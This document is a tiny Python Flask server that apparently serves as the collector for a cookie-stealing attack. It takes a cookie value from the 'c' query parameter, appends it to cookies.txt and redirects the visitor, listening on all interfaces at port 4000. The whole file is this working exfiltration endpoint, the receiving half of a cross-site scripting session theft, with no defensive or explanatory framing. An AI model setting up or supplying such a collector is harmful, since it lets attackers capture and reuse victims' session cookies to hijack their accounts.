	from flask import Flask, request, redirect
	
	app = Flask(__name__)
	
	@app.route('/')
	def cookie():
	    cookie = request.args.get('c')
	    f = open("cookies.txt", "a")
	    f.write(cookie + '\n')
	    f.close()
	    return redirect('127.0.0.1:5000/')
	
	
	if __name__ == '__main__':
	    app.run(host = '0.0.0.0', port=4000)
